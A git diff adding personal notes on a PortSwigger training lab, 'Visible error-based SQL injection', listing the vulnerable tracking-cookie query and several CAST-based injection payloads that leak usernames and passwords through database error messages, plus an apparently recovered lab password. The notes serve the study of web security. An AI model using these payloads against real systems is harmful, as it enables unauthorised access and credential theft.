@@ -30,3 +30,30 @@ identify the version of the oracle from the portswigger cheat sheet payloads
 <img width="1040" height="463" alt="image" src="https://github.com/user-attachments/assets/181722f1-c9c8-4dc9-aefc-e7ed83283721" />
 
 non oracle db version 
+
+## Lab: Visible error-based SQL injection
+
+<img width="1984" height="842" alt="image" src="https://github.com/user-attachments/assets/5a7dbdd9-201c-4249-86e5-01b6eb570e9b" />
+
+Lab #18 – Visible error-based SQL injection
+
+End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
+
+Analysis:
+
+select trackingId from trackingIdTable where trackingId='pFNjoVuG3fnTFJ3a''
+
+SELECT * FROM tracking WHERE id = 'pFNjoVuG3fnTFJ3a'--'. Expected  char
+
+
+CAST()
+
+
+pFNjoVuG3fnTFJ3a' AND CAST((SELECT 1) as int)--
+
+' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
+
+' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
+
+fc9v2vqq5gozv1cb0ibj
+
